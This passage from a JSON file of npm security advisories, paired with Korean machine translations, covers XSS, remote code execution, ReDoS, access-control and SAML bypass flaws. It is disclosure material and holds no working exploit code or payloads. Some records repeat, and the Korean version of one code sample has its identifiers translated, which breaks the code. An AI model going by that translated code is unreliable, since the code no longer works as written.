    "descriptionKR": "### 설명\n\n취약성 세부 정보를 마크다운 형식으로 제공하는 일반적인 관행으로 인해 Dependency-Track 프런트엔드는 JavaScript 라이브러리 [Showdown](https://github.com/showdownjs/showdown)를 사용하여 이를 렌더링합니다. Showdown [내장된 XSS 대책이 없음](https://github.com/showdownjs/showdown/wiki/Markdown's-XSS-Vulnerability-(and-how-to-mitigate-it)) 및 4.6 이전 버전. Dependency-Track 프런트엔드 중 1개가 Showdown의 출력을 인코딩하거나 삭제하지 않았습니다. 이로 인해 HTML 속성을 통해 취약성 세부 정보에 포함된 임의의 JavaScript가 프런트엔드 컨텍스트에서 실행될 수 있습니다.\n\n### 영향\n\n'VULNERABILITY_MANAGEMENT' 권한이 있는 행위자는 사용자 정의 취약성을 생성 또는 편집하고 다음 필드에 XSS 페이로드를 제공하여 이 약점을 악용할 수 있습니다.\n\n* 설명\n* 세부사항\n* 추천\n* 참고문헌\n\n수정된 취약점 페이지를 탐색할 때 `VIEW_PORTFOLIO` 권한이 있는 사용자에 대해 페이로드가 실행됩니다. 예를 들면 다음과 같습니다.\n\n```\nhttps://dtrack.example.com/vulnerabilities/INTERNAL/INT-jd8u-e8tl-8lwu\n```\n\n또는 Dependency-Track(NVD, GitHub Advisories, OSV, OSS Index, VulnDB)에 의해 미러링된 취약성 데이터베이스를 통해 악성 JavaScript가 유입될 수 있습니다. 그러나 이 공격 벡터는 거의 발생하지 않으며 팀은 이러한 일이 발생하는 것을 인식하지 못합니다.\n\n> **참고**\n> 프로젝트 보기에 있는 *취약점 감사* 탭의 *취약점 세부 정보* 요소는 영향을 받지 **않습니다**.\n\n### 패치\n\n이 문제는 프런트엔드 버전 4.6.1에서 수정되었습니다.\n\n### 신용 거래\n\n문제를 찾고 책임감 있게 공개해 주신 GitHub 사용자 **Waterstraal**에게 감사드립니다."
  },
  {
    "description": "Markdownify version 1.4.1 allows an external attacker to execute arbitrary code remotely on any client attempting to view a malicious markdown file through Markdownify. This is possible because the application has the \"nodeIntegration\" option enabled. There are currently no patched versions and no known workarounds.",
    "identifiers": "GHSA : GHSA-c942-mfmp-p4fh\nCVE : CVE-2022-41709",
    "severity": "HIGH",
    "updatedAt": "2023-01-30T05:02:55Z",
    "publishedAt": "2022-10-19T19:00:17Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-41709\nhttps://fluidattacks.com/advisories/adams/\nhttps://github.com/amitmerchant1990/electron-markdownify\nhttps://github.com/advisories/GHSA-c942-mfmp-p4fh",
    "name": "electron-markdownify",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 1.4.1",
    "descriptionKR": "Markdownify 버전 1.4.1을 사용하면 외부 공격자가 Markdownify를 통해 악성 마크다운 파일을 보려고 시도하는 모든 클라이언트에서 원격으로 임의 코드를 실행할 수 있습니다. 이는 응용 프로그램에 \"nodeIntegration\" 옵션이 활성화되어 있기 때문에 가능합니다. 현재 패치된 버전과 알려진 해결 방법이 없습니다."
  },
  {
    "description": "### Impact\n_What kind of vulnerability is it? Who is impacted?_\n\nIn Hardened JavaScript, programs can `harden` objects to safely share objects with co-tenant programs without risk of these other programs tampering with their API surface. Hardening does not guarantee that objects are pure or immutable, so a hardened `Map`, for example is superficially tamper-proof, but any party holding a reference to the object can both read and write its contents. Based on this precedent, and because `TypedArray` instances cannot be frozen with `Object.isFrozen`, `harden` does not `freeze` `TypedArrays` and instead makes them non-extensible and makes all non-indexed properties non-writable and non-configurable. This is consistent with the treatment of `Map` because the indexed properties represent mutable content and non-indexed properties represent the API.\n\nDue to a defect in `harden`, properties that have names that parse as numbers but are not the same as the canonical representation of those numbers, as in `\"+0\"` and `\"\"` which are both equivalent to their canonical number `\"0\"`,  remain writable after hardening.\n\nAny program treating one of these properties as part of its API and relying on `harden` to prevent modifications would be vulnerable to an API pollution attack, affecting only instances shared by mutually suspicious parties.\n\nUnlike a `Map`, a hardened `TypedArray` can only have numbers for content. Any program that is sharing hardened `TypedArrays` between co-tentant programs and relying on harden to only allow these programs to communicate exclusively by changing numbers within the bounds of the TypedArray, may inadvertently have arranged for a mechanism for a pair of third-parties to communicate arbitrary objects on these other properties.\n\n### Patches\n_Has the problem been patched? What versions should users upgrade to?_\n\nSES version 0.16.0 patches this issue, causing `harden` to recognize properties with non-canonical numeric representations and ensuring that these properties are non-configurable.\n\n### Workarounds\n_Is there a way for users to fix or remediate the vulnerability without upgrading?_\n\nUsers should avoid sharing `TypedArrays` between co-tenant programs and instead create wrapper objects that produce a read-only view of the underlying data. We allow `harden` to succeed for `TypedArrays` because the treatment is in fact consistent with the behavior of collections like `Map`, but all collections shared between co-tentant programs should probably be attenuated to either read- or write-only facets and probably close over only part of the content of the collection. However, the motivation for allowing `TypedArrays` to be hardened in practice is to allow certain legacy modules to function under Hardened JavaScript with LavaMoat, since they export `TypedArrays`, even though they would ideally export read-only facets of these.\n\n### References\n_Are there any links users can visit to find out more?_\n\nNot at this time.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Email us at [security@agoric.com](mailto:security@agoric.com)\n",
    "identifiers": "GHSA : GHSA-whpx-q3rq-w8jc",
    "severity": "LOW",
    "updatedAt": "2023-01-09T05:07:54Z",
    "publishedAt": "2022-10-20T18:38:35Z",
    "references": "https://github.com/endojs/endo/security/advisories/GHSA-whpx-q3rq-w8jc\nhttps://github.com/endojs/endo/commit/88cab0be4cf816dc578f2ff441fd9bcda0aa5cf5\nhttps://github.com/advisories/GHSA-whpx-q3rq-w8jc",
    "name": "ses",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.16.0",
    "identifier": "0.16.0",
    "descriptionKR": "### 영향\n_어떤 종류의 취약점입니까? 누가 영향을 받습니까?_\n\nHardened JavaScript에서 프로그램은 개체를 '강화'하여 다른 프로그램이 API 표면을 조작할 위험 없이 공동 테넌트 프로그램과 개체를 안전하게 공유할 수 있습니다. 강화는 객체가 순수하거나 불변임을 보장하지 않으므로 예를 들어 강화된 'Map'은 표면적으로 변조 방지되지만 객체에 대한 참조를 보유한 모든 당사자는 내용을 읽고 쓸 수 있습니다. 이 선례에 따라 `Object.isFrozen`으로 `TypedArray` 인스턴스를 고정할 수 없기 때문에 `harden`은 `TypedArrays`를 `고정`하지 않고 대신 인스턴스를 확장 불가능하게 만들고 인덱싱되지 않은 모든 속성을 쓰기 불가능하게 만듭니다. 구성할 수 없습니다. 인덱싱된 속성은 변경 가능한 콘텐츠를 나타내고 인덱싱되지 않은 속성은 API를 나타내므로 이는 'Map' 처리와 일치합니다.\n\n`harden`의 결함으로 인해, `\"+0\"` 및 `\"\"`에서와 같이 숫자로 구문 분석되는 이름이 있지만 해당 숫자의 정식 표현과 동일하지 않은 속성은 해당 정식과 동일합니다. 숫자 `\"0\"`, 강화 후에도 쓰기 가능 상태로 유지됩니다.\n\n이러한 속성 중 하나를 API의 일부로 취급하고 수정을 방지하기 위해 'harden'에 의존하는 모든 프로그램은 API 오염 공격에 취약하여 상호 의심스러운 당사자가 공유하는 인스턴스에만 영향을 미칩니다.\n\n`Map`과 달리 강화된 `TypedArray`는 콘텐츠에 대한 숫자만 가질 수 있습니다. co-tentant 프로그램 간에 강화된 `TypedArrays`를 공유하고 이러한 프로그램이 TypedArray 범위 내에서 번호를 변경하여 독점적으로 통신할 수 있도록 강화에 의존하는 모든 프로그램은 실수로 제3자 쌍을 위한 메커니즘을 마련했을 수 있습니다. 이러한 다른 속성에서 임의의 개체를 통신합니다.\n\n### 패치\n_문제가 패치되었나요? 사용자는 어떤 버전으로 업그레이드해야 합니까?_\n\nSES 버전 0.16.0은 이 문제를 패치하여 'harden'이 비정규 숫자 표현이 있는 속성을 인식하고 이러한 속성을 구성할 수 없도록 합니다.\n\n### 해결 방법\n_사용자가 업그레이드하지 않고 취약점을 수정하거나 치료할 수 있는 방법이 있습니까?_\n\n사용자는 공동 테넌트 프로그램 간에 'TypedArrays'를 공유하지 말고 대신 기본 데이터의 읽기 전용 보기를 생성하는 래퍼 개체를 만들어야 합니다. 처리가 실제로 `Map`과 같은 컬렉션의 동작과 일치하기 때문에 `harden`이 `TypedArrays`에 대해 성공하도록 허용하지만 공동 임차 프로그램 간에 공유되는 모든 컬렉션은 아마도 읽기 또는 쓰기 전용 패싯으로 약화되어야 합니다. 컬렉션 콘텐츠의 일부만 닫을 수도 있습니다. 그러나 실제로 `TypedArrays`를 강화하도록 허용하는 동기는 특정 레거시 모듈이 LavaMoat를 사용하여 Hardened JavaScript에서 작동하도록 허용하는 것입니다. 왜냐하면 이상적으로는 이러한 모듈의 읽기 전용 측면을 내보내더라도 `TypedArrays`를 내보내기 때문입니다.\n\n### 참조\n_사용자가 자세히 알아보기 위해 방문할 수 있는 링크가 있습니까?_\n\n지금은 아닙니다.\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있는 경우:\n* [security@agoric.com](mailto:security@agoric.com)으로 이메일을 보내주세요."
  },
  {
    "description": "The package react-native-reanimated before 2.10.0 is vulnerable to Regular Expression Denial of Service (ReDoS) due to improper usage of regular expression in the parser of Colors.js.",
    "identifiers": "GHSA : GHSA-2j79-8pqc-r7x6\nCVE : CVE-2022-24373",
    "severity": "HIGH",
    "updatedAt": "2023-08-08T21:17:57Z",
    "publishedAt": "2022-10-01T00:00:24Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-24373\nhttps://github.com/software-mansion/react-native-reanimated/pull/3382\nhttps://github.com/software-mansion/react-native-reanimated/pull/3382/commits/7adf06d0c59382d884a04be86a96eede3d0432fa\nhttps://github.com/software-mansion/react-native-reanimated/releases/tag/3.0.0-rc.1\nhttps://security.snyk.io/vuln/SNYK-JS-REACTNATIVEREANIMATED-2949507\nhttps://github.com/software-mansion/react-native-reanimated/commit/8a927904366fa2d02df7a11553f8b0aa93471279\nhttps://github.com/software-mansion/react-native-reanimated/compare/2.9.1...2.10.0\nhttps://github.com/advisories/GHSA-2j79-8pqc-r7x6",
    "name": "react-native-reanimated",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 2.10.0",
    "identifier": "2.10.0",
    "descriptionKR": "2.10.0 이전에 react-native-reanimated 패키지는 Colors.js 파서에서 정규식을 부적절하게 사용하여 정규식 서비스 거부(ReDoS)에 취약합니다."
  },
  {
    "description": "#### Impact\n\n`@keystone-6/core@2.2.0 || 2.3.0` users who are using the `multiselect` field, and provided field-level access control - are vulnerable to their field-level access control not being used.\n\nList-level access control is **NOT** affected.\n\nField-level access control for fields other than `multiselect` are **NOT** affected.\n\nExample, **you are vulnerable if** you are using field-level access control on a `multiselect` like the following:\n```ts\nconst yourList = list({\n  access: {\n    // this is list-level access control, this is NOT impacted\n  },\n  fields: {\n    yourFieldName: multiselect({\n      // this is field-level access control, for multiselect fields\n      //   this is vulnerable\n      access: {\n        create: ({ session }) => session?.data.isAdmin,\n        update: ({ session }) => session?.data.isAdmin,\n      },\n      options: [\n        { value: 'apples', label: 'Apples' },\n        { value: 'oranges', label: 'Oranges' },\n      ],\n      // ...\n    }),\n    // ...\n  },\n  // ...\n});\n```\n\n#### Mitigation\nPlease upgrade to `@keystone-6/core >= 2.3.1`, where this vulnerability has been closed.\n\n#### Workarounds\nIf for some reason you cannot upgrade your dependencies, you should stop using the `multiselect` field.\n\n#### Credits\nThanks to [Marek R](https://github.com/marekryb) for reporting and submitting the pull request to fix this problem.\n\nIf you have any questions around this security advisory, please don't hesitate to contact us at [security@keystonejs.com](mailto:security@keystonejs.com), or [open an issue on GitHub](https://github.com/keystonejs/keystone/issues/new/choose).\n\nIf you have a security flaw to report for any software in this repository, please see our [SECURITY policy](https://github.com/keystonejs/keystone/blob/main/SECURITY.md).",
    "identifiers": "GHSA : GHSA-6mhr-52mv-6v6f\nCVE : CVE-2022-39322",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-30T05:02:55Z",
    "publishedAt": "2022-10-18T17:12:46Z",
    "references": "https://github.com/keystonejs/keystone/security/advisories/GHSA-6mhr-52mv-6v6f\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-39322\nhttps://github.com/keystonejs/keystone/commit/65c6ee3deef23605fc72b80230908696a7a65e7c\nhttps://github.com/advisories/GHSA-6mhr-52mv-6v6f",
    "name": "@keystone-6/core",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 2.2.0, < 2.3.1",
    "identifier": "2.3.1",
    "descriptionKR": "#### 영향\n\n`@keystone-6/core@2.2.0 || 2.3.0` 사용자는 `multiselect` 필드를 사용하고 필드 수준 액세스 제어가 제공되며 필드 수준 액세스 제어가 사용되지 않는 것에 취약합니다.\n\n목록 수준 액세스 제어는 영향을 받지 **않습니다**.\n\n`다중 선택` 이외의 필드에 대한 필드 수준 액세스 제어는 영향을 받지 **않습니다**.\n\n예를 들어 **다음과 같이 `다중 선택`에서 필드 수준 액세스 제어를 사용하는 경우** 취약합니다.\n```ts\nconst yourList = 목록({\n  입장: {\n    // 이것은 목록 수준 액세스 제어이며 영향을 받지 않습니다.\n  },\n  필드: {\n    yourFieldName: 다중 선택({\n      // 다중 선택 필드에 대한 필드 수준 액세스 제어입니다.\n      // 이것은 취약하다\n      입장: {\n        생성: ({ 세션 }) => 세션?.data.isAdmin,\n        업데이트: ({ 세션 }) => 세션?.data.isAdmin,\n      },\n      옵션: [\n        { 값: '사과', 라벨: '사과' },\n        { 값: '오렌지', 라벨: '오렌지' },\n      ],\n      // ...\n    }),\n    // ...\n  },\n  // ...\n});\n```\n\n#### 완화\n이 취약점이 닫힌 `@keystone-6/core >= 2.3.1`으로 업그레이드하십시오.\n\n#### 해결 방법\n어떤 이유로 종속성을 업그레이드할 수 없는 경우 '다중 선택' 필드 사용을 중지해야 합니다.\n\n#### 크레딧\n이 문제를 해결하기 위해 풀 리퀘스트를 보고하고 제출한 [Marek R](https://github.com/marekryb)에게 감사드립니다.\n\n이 보안 권고에 대해 질문이 있는 경우 주저하지 말고 [security@keystonejs.com](mailto:security@keystonejs.com)으로 문의하거나 [GitHub에서 문제 열기](https://github .com/keystonejs/keystone/issues/new/choose).\n\n이 리포지토리의 소프트웨어에 대해 보고할 보안 결함이 있는 경우 [보안 정책](https://github.com/keystonejs/keystone/blob/main/SECURITY.md)을 참조하세요."
  },
  {
    "description": "### Impact\n\nParse Server crashes when a file download request is received with an invalid byte range.\n\n### Patches\n\nImproved parsing of the range parameter to properly handle invalid range requests.\n\n### Workarounds\n\nNone\n\n### References\n\n- [GHSA-h423-w6qv-2wj3](https://github.com/parse-community/parse-server/security/advisories/GHSA-h423-w6qv-2wj3)",
    "identifiers": "GHSA : GHSA-h423-w6qv-2wj3\nCVE : CVE-2022-39313",
    "severity": "HIGH",
    "updatedAt": "2023-07-14T21:55:54Z",
    "publishedAt": "2022-10-18T16:08:49Z",
    "references": "https://github.com/parse-community/parse-server/security/advisories/GHSA-h423-w6qv-2wj3\nhttps://github.com/parse-community/parse-server/releases/tag/4.10.17\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-39313\nhttps://github.com/advisories/GHSA-h423-w6qv-2wj3",
    "name": "parse-server",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 5.0.0, < 5.2.8",
    "identifier": "5.2.8",
    "descriptionKR": "### 영향\n\n잘못된 바이트 범위로 파일 다운로드 요청을 받으면 Parse Server가 충돌합니다.\n\n### 패치\n\n유효하지 않은 범위 요청을 적절하게 처리하기 위해 범위 매개변수의 구문 분석이 개선되었습니다.\n\n### 해결 방법\n\n없음\n\n### 참조\n\n- [GHSA-h423-w6qv-2wj3](https://github.com/parse-community/parse-server/security/advisories/GHSA-h423-w6qv-2wj3)"
  },
  {
    "description": "### Impact\n\nParse Server crashes when a file download request is received with an invalid byte range.\n\n### Patches\n\nImproved parsing of the range parameter to properly handle invalid range requests.\n\n### Workarounds\n\nNone\n\n### References\n\n- [GHSA-h423-w6qv-2wj3](https://github.com/parse-community/parse-server/security/advisories/GHSA-h423-w6qv-2wj3)",
    "identifiers": "GHSA : GHSA-h423-w6qv-2wj3\nCVE : CVE-2022-39313",
    "severity": "HIGH",
    "updatedAt": "2023-07-14T21:55:54Z",
    "publishedAt": "2022-10-18T16:08:49Z",
    "references": "https://github.com/parse-community/parse-server/security/advisories/GHSA-h423-w6qv-2wj3\nhttps://github.com/parse-community/parse-server/releases/tag/4.10.17\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-39313\nhttps://github.com/advisories/GHSA-h423-w6qv-2wj3",
    "name": "parse-server",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 4.10.17",
    "identifier": "4.10.17",
    "descriptionKR": "### 영향\n\n잘못된 바이트 범위로 파일 다운로드 요청을 받으면 Parse Server가 충돌합니다.\n\n### 패치\n\n유효하지 않은 범위 요청을 적절하게 처리하기 위해 범위 매개변수의 구문 분석이 개선되었습니다.\n\n### 해결 방법\n\n없음\n\n### 참조\n\n- [GHSA-h423-w6qv-2wj3](https://github.com/parse-community/parse-server/security/advisories/GHSA-h423-w6qv-2wj3)"
  },
  {
    "description": "## Withdrawn\n\nThis advisory has been withdrawn because the maintainers of `@xmldom/xmldom` and multiple third parties disputed the validity of the issue. Attempts to create or replicate a proof of concept have been unsuccessful.\n\n## Original Description\n\n### Impact\nA prototype pollution vulnerability exists in the function copy in dom.js in the xmldom (published as @xmldom/xmldom) package.\n\n### Patches\nUpdate to `@xmldom/xmldom@~0.7.6`, `@xmldom/xmldom@~0.8.3` (dist-tag `latest`) or `@xmldom/xmldom@>=0.9.0-beta.2` (dist-tag `next`).\n\n### Workarounds\nNone\n\n### References\nhttps://github.com/xmldom/xmldom/pull/437\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Email us at security@xmldom.org\n* Add information to https://github.com/xmldom/xmldom/issues/436\n",
    "identifiers": "GHSA : GHSA-9pgh-qqpf-7wqj\nCVE : CVE-2022-37616",
    "severity": "CRITICAL",
    "updatedAt": "2023-02-02T05:07:15Z",
    "publishedAt": "2022-10-11T20:42:57Z",
    "withdrawnAt": "2022-11-08T19:35:06Z",
    "references": "https://github.com/xmldom/xmldom/security/advisories/GHSA-9pgh-qqpf-7wqj\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-37616\nhttps://github.com/xmldom/xmldom/issues/436\nhttps://github.com/xmldom/xmldom/pull/437\nhttps://github.com/xmldom/xmldom/blob/bc36efddf9948aba15618f85dc1addfc2ac9d7b2/lib/dom.js#L1\nhttps://github.com/xmldom/xmldom/blob/bc36efddf9948aba15618f85dc1addfc2ac9d7b2/lib/dom.js#L3\nhttps://github.com/xmldom/xmldom/blob/master/CHANGELOG.md#076\nhttps://lists.debian.org/debian-lts-announce/2022/10/msg00023.html\nhttps://github.com/xmldom/xmldom/issues/436#issuecomment-1319412826\nhttps://github.com/xmldom/xmldom/issues/436#issuecomment-1327776560\nhttps://dl.acm.org/doi/abs/10.1145/3488932.3497769\nhttps://dl.acm.org/doi/pdf/10.1145/3488932.3497769\nhttp://users.encs.concordia.ca/~mmannan/publications/JS-vulnerability-aisaccs2022.pdf\nhttps://github.com/advisories/GHSA-9pgh-qqpf-7wqj",
    "name": "@xmldom/xmldom",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.7.6",
    "identifier": "0.7.6",
    "descriptionKR": "## 철회\n\n이 권고는 `@xmldom/xmldom`의 관리자 및 여러 제3자가 문제의 유효성에 대해 이의를 제기했기 때문에 철회되었습니다. 개념 증명을 만들거나 복제하려는 시도는 성공하지 못했습니다.\n\n## 원본 설명\n\n### 영향\nxmldom(@xmldom/xmldom으로 게시됨) 패키지의 dom.js에 있는 함수 사본에 프로토타입 오염 취약성이 존재합니다.\n\n### 패치\n`@xmldom/xmldom@~0.7.6`, `@xmldom/xmldom@~0.8.3`(dist-tag `latest`) 또는 `@xmldom/xmldom@>=0.9.0-beta.2`로 업데이트 (dist-tag `다음`).\n\n### 해결 방법\n없음\n\n### 참조\nhttps://github.com/xmldom/xmldom/pull/437\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있는 경우:\n* security@xmldom.org로 이메일을 보내주세요.\n* https://github.com/xmldom/xmldom/issues/436에 정보 추가"
  },
  {
    "description": "## Withdrawn\n\nThis advisory has been withdrawn because the maintainers of `@xmldom/xmldom` and multiple third parties disputed the validity of the issue. Attempts to create or replicate a proof of concept have been unsuccessful.\n\n## Original Description\n\n### Impact\nA prototype pollution vulnerability exists in the function copy in dom.js in the xmldom (published as @xmldom/xmldom) package.\n\n### Patches\nUpdate to `@xmldom/xmldom@~0.7.6`, `@xmldom/xmldom@~0.8.3` (dist-tag `latest`) or `@xmldom/xmldom@>=0.9.0-beta.2` (dist-tag `next`).\n\n### Workarounds\nNone\n\n### References\nhttps://github.com/xmldom/xmldom/pull/437\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Email us at security@xmldom.org\n* Add information to https://github.com/xmldom/xmldom/issues/436\n",
    "identifiers": "GHSA : GHSA-9pgh-qqpf-7wqj\nCVE : CVE-2022-37616",
    "severity": "CRITICAL",
    "updatedAt": "2023-02-02T05:07:15Z",
    "publishedAt": "2022-10-11T20:42:57Z",
    "withdrawnAt": "2022-11-08T19:35:06Z",
    "references": "https://github.com/xmldom/xmldom/security/advisories/GHSA-9pgh-qqpf-7wqj\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-37616\nhttps://github.com/xmldom/xmldom/issues/436\nhttps://github.com/xmldom/xmldom/pull/437\nhttps://github.com/xmldom/xmldom/blob/bc36efddf9948aba15618f85dc1addfc2ac9d7b2/lib/dom.js#L1\nhttps://github.com/xmldom/xmldom/blob/bc36efddf9948aba15618f85dc1addfc2ac9d7b2/lib/dom.js#L3\nhttps://github.com/xmldom/xmldom/blob/master/CHANGELOG.md#076\nhttps://lists.debian.org/debian-lts-announce/2022/10/msg00023.html\nhttps://github.com/xmldom/xmldom/issues/436#issuecomment-1319412826\nhttps://github.com/xmldom/xmldom/issues/436#issuecomment-1327776560\nhttps://dl.acm.org/doi/abs/10.1145/3488932.3497769\nhttps://dl.acm.org/doi/pdf/10.1145/3488932.3497769\nhttp://users.encs.concordia.ca/~mmannan/publications/JS-vulnerability-aisaccs2022.pdf\nhttps://github.com/advisories/GHSA-9pgh-qqpf-7wqj",
    "name": "@xmldom/xmldom",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 0.8.0, < 0.8.3",
    "identifier": "0.8.3",
    "descriptionKR": "## 철회\n\n이 권고는 `@xmldom/xmldom`의 관리자 및 여러 제3자가 문제의 유효성에 대해 이의를 제기했기 때문에 철회되었습니다. 개념 증명을 만들거나 복제하려는 시도는 성공하지 못했습니다.\n\n## 원본 설명\n\n### 영향\nxmldom(@xmldom/xmldom으로 게시됨) 패키지의 dom.js에 있는 함수 사본에 프로토타입 오염 취약성이 존재합니다.\n\n### 패치\n`@xmldom/xmldom@~0.7.6`, `@xmldom/xmldom@~0.8.3`(dist-tag `latest`) 또는 `@xmldom/xmldom@>=0.9.0-beta.2`로 업데이트 (dist-tag `다음`).\n\n### 해결 방법\n없음\n\n### 참조\nhttps://github.com/xmldom/xmldom/pull/437\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있는 경우:\n* security@xmldom.org로 이메일을 보내주세요.\n* https://github.com/xmldom/xmldom/issues/436에 정보 추가"
  },
  {
    "description": "### Impact\n\nA remote attacker may be able to bypass SAML authentication on a website using passport-saml. A successful attack requires that the attacker is in possession of an arbitrary IDP signed XML element. Depending on the IDP used, fully unauthenticated attacks (e.g without access to a valid user) might also be feasible if generation of a signed message can be triggered.\n\n### Patches\n\nUsers should upgrade to node-saml v4.0.0-beta5 or newer. \n\n### Workarounds\n\nDisable SAML authentication.\n\n### References\n_Are there any links users can visit to find out more?_\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open a discussion in the [node-saml repo](https://github.com/node-saml/node-saml/discussions)\n\n### Credits\n\n* Felix Wilhelm of Google Project Zero\n\n",
    "identifiers": "GHSA : GHSA-5p8w-2mvw-38pv\nCVE : CVE-2022-39300",
    "severity": "HIGH",
    "updatedAt": "2023-01-28T05:04:55Z",
    "publishedAt": "2022-10-12T22:05:44Z",
    "references": "https://github.com/node-saml/node-saml/security/advisories/GHSA-5p8w-2mvw-38pv\nhttps://github.com/node-saml/node-saml/commit/c1f275c289c01921e58f5c70ce0fdbc5287e5fbe\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-39300\nhttps://github.com/advisories/GHSA-5p8w-2mvw-38pv",
    "name": "node-saml",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 4.0.0-beta.5",
    "identifier": "4.0.0-beta.5",
    "descriptionKR": "### 영향\n\n원격 공격자가 passport-saml을 사용하여 웹사이트에서 SAML 인증을 우회할 수 있습니다. 공격이 성공하려면 공격자가 임의의 IDP 서명 XML 요소를 소유하고 있어야 합니다. 사용된 IDP에 따라 서명된 메시지 생성이 트리거될 수 있는 경우 완전히 인증되지 않은 공격(예: 유효한 사용자에 대한 액세스 권한 없음)도 가능할 수 있습니다.\n\n### 패치\n\n사용자는 node-saml v4.0.0-beta5 이상으로 업그레이드해야 합니다.\n\n### 해결 방법\n\nSAML 인증을 비활성화합니다.\n\n### 참조\n_사용자가 자세히 알아보기 위해 방문할 수 있는 링크가 있습니까?_\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있는 경우:\n* [node-saml 저장소](https://github.com/node-saml/node-saml/discussions)에서 토론 열기\n\n### 크레딧\n\n* Google Project Zero의 Felix Wilhelm"
  },
  {
    "description": "### Impact\n\nA remote attacker may be able to bypass SAML authentication on a website using passport-saml. A successful attack requires that the attacker is in possession of an arbitrary IDP signed XML element. Depending on the IDP used, fully unauthenticated attacks (e.g without access to a valid user) might also be feasible if generation of a signed message can be triggered.\n\n### Patches\n\nUsers should upgrade to passport-saml 3.2.2 or newer. The issue was also present in the beta releases of `node-saml` before v4.0.0-beta.5.\n\n### Workarounds\n\nDisable SAML authentication.\n\n### References\n_Are there any links users can visit to find out more?_\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open a discussion in the [node-saml repo](https://github.com/node-saml/node-saml/discussions)\n\n### Credits\n\n* Felix Wilhelm of Google Project Zero\n",
    "identifiers": "GHSA : GHSA-m974-647v-whv7\nCVE : CVE-2022-39299",
    "severity": "HIGH",
    "updatedAt": "2023-01-27T05:03:24Z",
    "publishedAt": "2022-10-12T22:05:41Z",
    "references": "https://github.com/node-saml/passport-saml/security/advisories/GHSA-m974-647v-whv7\nhttps://github.com/node-saml/passport-saml/commit/8b7e3f5a91c8e5ac7e890a0c90bc7491ce33155e\nhttps://github.com/node-saml/passport-saml/releases/tag/v3.2.2\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-39299\nhttp://packetstormsecurity.com/files/169826/Node-saml-Root-Element-Signature-Bypass.html\nhttps://github.com/advisories/GHSA-m974-647v-whv7",
    "name": "@node-saml/passport-saml",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 4.0.0-beta.3",
    "identifier": "4.0.0-beta.3",
    "descriptionKR": "### 영향\n\n원격 공격자가 passport-saml을 사용하여 웹사이트에서 SAML 인증을 우회할 수 있습니다. 공격이 성공하려면 공격자가 임의의 IDP 서명 XML 요소를 소유하고 있어야 합니다. 사용된 IDP에 따라 서명된 메시지 생성이 트리거될 수 있는 경우 완전히 인증되지 않은 공격(예: 유효한 사용자에 대한 액세스 권한 없음)도 가능할 수 있습니다.\n\n### 패치\n\n사용자는 passport-saml 3.2.2 이상으로 업그레이드해야 합니다. 이 문제는 v4.0.0-beta.5 이전의 `node-saml` 베타 릴리스에도 있었습니다.\n\n### 해결 방법\n\nSAML 인증을 비활성화합니다.\n\n### 참조\n_사용자가 자세히 알아보기 위해 방문할 수 있는 링크가 있습니까?_\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있는 경우:\n* [node-saml 저장소](https://github.com/node-saml/node-saml/discussions)에서 토론 열기\n\n### 크레딧\n\n* Google Project Zero의 Felix Wilhelm"
  },
  {
    "description": "### Impact\n\nA remote attacker may be able to bypass SAML authentication on a website using passport-saml. A successful attack requires that the attacker is in possession of an arbitrary IDP signed XML element. Depending on the IDP used, fully unauthenticated attacks (e.g without access to a valid user) might also be feasible if generation of a signed message can be triggered.\n\n### Patches\n\nUsers should upgrade to passport-saml 3.2.2 or newer. The issue was also present in the beta releases of `node-saml` before v4.0.0-beta.5.\n\n### Workarounds\n\nDisable SAML authentication.\n\n### References\n_Are there any links users can visit to find out more?_\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open a discussion in the [node-saml repo](https://github.com/node-saml/node-saml/discussions)\n\n### Credits\n\n* Felix Wilhelm of Google Project Zero\n",
    "identifiers": "GHSA : GHSA-m974-647v-whv7\nCVE : CVE-2022-39299",
    "severity": "HIGH",
    "updatedAt": "2023-01-27T05:03:24Z",
    "publishedAt": "2022-10-12T22:05:41Z",
    "references": "https://github.com/node-saml/passport-saml/security/advisories/GHSA-m974-647v-whv7\nhttps://github.com/node-saml/passport-saml/commit/8b7e3f5a91c8e5ac7e890a0c90bc7491ce33155e\nhttps://github.com/node-saml/passport-saml/releases/tag/v3.2.2\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-39299\nhttp://packetstormsecurity.com/files/169826/Node-saml-Root-Element-Signature-Bypass.html\nhttps://github.com/advisories/GHSA-m974-647v-whv7",
    "name": "@node-saml/node-saml",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 4.0.0-beta.5",
    "identifier": "4.0.0-beta.5",
